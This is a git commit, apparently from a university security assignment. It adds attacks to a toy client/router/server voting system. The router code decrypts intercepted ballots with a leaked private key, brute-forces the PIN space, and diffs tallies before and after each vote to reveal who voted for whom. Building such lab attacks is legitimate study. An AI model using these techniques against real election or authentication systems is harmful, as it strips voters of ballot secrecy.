c7fb18564a9100d8ad1610220a2493343c526a5d
Ryan Vernick <rpvernick@wpi.edu>
2026-04-29 15:58:32 -0400

    finalized the brute force attack implementation
    included multithreading so that the client's experience is unimpacted even as the router finds all of the PINs and then eventually decrypts all of the votes

--- A2 Work/readme.md
+++ A2 Work/readme.md
@@ -8,6 +8,29 @@ python -m pip install -r requirements.txt
 
 Then, open three terminal windows and run first the `server.py` file first in one window, followed by the `router.py` file in the second, and lastly the `client.py` file in the thirs window. Follow the on-screen prompts to authenticate a pin and submit a ballot. The following pins are already registered to be used, any other pins will not be allowed to submit a ballot to the server. If you want to reset the ballots, clear the pins from the `votes.csv` file and change the numbers under each candidate to 0.
 
+
+
+After submitting a vote via the client, if you go to the router window, you will see both of out implemented attacks working. 
+- First, a leaked private key attack that allows us to simply read the vote request as it passes through. this appears directly along with each vote, and shows up as 
+
+
+// Breach
+// Intercepted Plaintext PIN: [clients pin]
+// Intercepted Vote For: Candidate [candidate of choice]
+
+
+-Second, a brute force attack on the valid PINs. This attack creates a separate thread that goes through the entire keyspace, saving the hashed and unhashed versions of every valid key into a dictionary. Separately, as each vote comes in, it saves the before and after state of the election data (candidate votes & voted PINs). When the thread finding all valid keys finishes, it goes through the collected data and finds the pin and candidate of each vote already cast. After that, it finds that information live as the vote goes through. this will show up in terminal as either:
+
+// bruteforce: pins not known yet 
+
+if the thread is still running, OR
+
+// bruteforce: voter with PIN #[client's pin] voted for candidate [candidate of choice].
+
+if the thread is finished already.
+
+
+
 Valid PINs:
 
 * 528293088
--- A2 Work/router.py
+++ A2 Work/router.py
@@ -14,9 +14,9 @@ import json
 from fastapi import FastAPI, status, Request
 from fastapi.responses import Response
 import rsa
+import csv
 ''' unused:
 #import base64
-#import csv
 #from hashlib import sha256
 #from pydantic import BaseModel
 #from pathlib import Path
@@ -24,7 +24,10 @@ import rsa
 '''
 # NEW IMPORTS
 import asyncio
+from concurrent.futures import ThreadPoolExecutor
 import bruteForce
+
+
 
 #load leaked private key for man in the middle attack
 with open("private.pem", "rb") as f:
@@ -42,6 +45,10 @@ SERVER_ADDR = "127.0.0.2"
 SERVER_PORT = "8000"
 SERVER_URL = f"http://{SERVER_ADDR}:{SERVER_PORT}"
 
+
+#################################
+#### for being the middleman ####
+#################################
 
 # appears to work fully
 @app.get("/candidates")
@@ -96,7 +103,13 @@ async def authorize_pin_endpoint(request: Request):
 async def vote_endpoint(request: Request):
     #intercepting payload
     encrypted_vote = await request.body()
-    
+
+    '''attack 1(?) -> compare before/after vote'''
+    votes1, pins1 = extract_data()
+    ''''''
+
+
+    ''' attack 2(?) -> leaked Private Key'''
     #decrypt the payload using the leaked private key
     try:
         decrypted_vote = rsa.decrypt(encrypted_vote, priv_key)
@@ -106,9 +119,25 @@ async def vote_endpoint(request: Request):
         print(f"Intercepted Vote For: {vote_data['Vote']}\n")
     except Exception as e:
         print(f"Failed to decrypt intercepted payload: {e}")
+    ''''''
+
 
     # forward original encrypted payload to real server
     response = requests.post(url=f"{SERVER_URL}/vote", data=encrypted_vote, headers={'Content-Type': 'application/octet-stream'})
+
+
+    '''attack 1(?) continued -> compare before/after vote'''
+    votes2, pins2 = extract_data()
+
+    # make sure you have good data before continuing
+    if response.status_code == 200:
+        this_vote = unmaskVote(votes1, votes2, pins1, pins2)
+
+        # candidate = 0 is the error return state for unmaskVote, so don't log that as an input
+        if this_vote[1] != 0:
+            known_votes.append(this_vote)
+    ''''''
+
 
     #Return the exact response back to the client
     if response.status_code == 401:
@@ -120,12 +149,184 @@ async def vote_endpoint(request: Request):
     else:
         return Response(status_code=status.HTTP_400_BAD_REQUEST)
 
-        
 
-if __name__ == "__main__":
+##############################
+#### for isolating a vote ####
+##############################
+
+global pins_known
+
+pins_known = False
+
+unknown_votes = []
+
+known_votes = []
+
+leaked_IDs = {}
+
+
+### helper function pulled directly from client
+def get_res(res: Response):
+    try:
+        return res.json()
+    except requests.exceptions.JSONDecodeError:
+        return None
+
+### helper function modified from server
+## returns the list of pins that have voted
+def voted_pins():
+
+    # this function can be modified if we need to switch from a CSV to a sqlite database or smth else
+    output = []
+    with open("votes.csv", mode='r') as db_file:
+        csv_reader = csv.DictReader(db_file)
+        for entry in csv_reader:
+            if entry['PIN'] != '':
+                output.append(entry['PIN'])
+
+    return output
+
+# asks the server for the election data
+# returns a list of the current candidate tallies, and a list of who has voted
+# [candidate tallies] , [voter PINs]
+def extract_data():
+
+    voter_pins = voted_pins()
+
+    candidate_tallies = []
+
+    response = requests.get(url=f"{SERVER_URL}/validate_votes")
+    
+    response_text = get_res(response)
+    
+    if not response_text:
+        print("No candidates with votes returned from server!")
+        return
+    
+    #print(response_text)
+    
+    data = json.loads(response_text)
+    
+    for entry in data.keys():
+        #entry_name = "# of valid pins voted" if entry == "num_pins" else entry
+
+        if entry != "num_pins":
+            candidate_tallies.append(data[entry])
+
+    return candidate_tallies , voter_pins
+        
+## returns [unhashed pin, candidate]
+def unmaskVote(votes1, votes2, pins1, pins2):
+
+    if pins_known:
+
+        ##################
+        # find who voted #
+        ##################
+
+        # remove all the pins that are in pins1 from pins2
+        for temp_pin in pins1:
+            pins2.remove(temp_pin)
+        # if there is more than one pin left, return nothing and throw an error
+        if len(pins2) != 1:
+            print("bruteforce: incorrect number of votes registered, cannot find the voter")
+            return ["0",0]
+        ## now we know there is only one pin in pins2
+        pin = pins2[0]
+
+        # the valid pins are known, so we can search through the leaked PIN/IDs
+        # this is who cast the last vote
+        unhashed_pin = leaked_IDs[pin]
+
+
+        ###########################
+        # find who they voted for #
+        ###########################
+
+        candidate = 0
+
+        # go through the candidates
+        for i in range(len(votes1)):
+
+            # subtract how many votes each candidate had before this last vote
+            # from how many they have now
+            votes2[i] -= votes1[i]
+
+            # if they aren't equal, that was the selected candidate
+            if votes2[i] != 0:
+                candidate = i+1
+                # returns the (unhashed) ID, and their respective candidate
+                print (f"bruteforce: voter with PIN #{unhashed_pin} voted for candidate {candidate}.")
+
+                ### !!!
+                ### this is who cast the last vote and who they voted for
+                ### !!!
+                return [unhashed_pin, candidate]
+
+        # if all of them were equal, something went wrong
+        print("bruteforce: could not find a difference between before and after the vote")
+        return ["0", 0]
+
+    else:
+        print("bruteforce: pins not known yet")
+        unknown_votes.append([votes1, votes2, pins1, pins2])
+        return ["0", 0]
+
+
+def unmaskVotes():
+    for vote in unknown_votes:
+        
+        this_vote = unmaskVote(vote[0], vote[1], vote[2], vote[3])
+
+        # candidate = 0 is the error return state for unmaskVote, so don't log that as an input
+        if this_vote[1] != 0:
+            known_votes.append(this_vote)
+
+
+
+def runServer():
 
     print(f"[i] Started server on port {PORT}")
 
     uvicorn.run(app, host="0.0.0.0", port=PORT)
 
-    asyncio.run(bruteForce.getKeys()) 
+async def getPins():
+
+    global pins_known
+
+    await bruteForce.getKeys(leaked_IDs)
+
+    pins_known = True
+
+    print("bruteforce: pins are known!")
+
+    unmaskVotes()
+
+async def main():
+
+    loop = asyncio.get_running_loop()
+
+    with ThreadPoolExecutor() as pool:
+        blocking_future = loop.run_in_executor(pool, runServer)
+
+        await asyncio.gather(
+            getPins(),
+            blocking_future
+        )
+
+###############################################
+#### what happens when we atart the server ####
+###############################################
+
+if __name__ == "__main__":
+
+    #print(f"[i] Started server on port {PORT}")
+
+    #asyncio.run(bruteForce.getKeys(leaked_IDs)) 
+
+    #print(leaked_IDs)
+
+    #uvicorn.run(app, host="0.0.0.0", port=PORT)
+
+    asyncio.run(main())
+
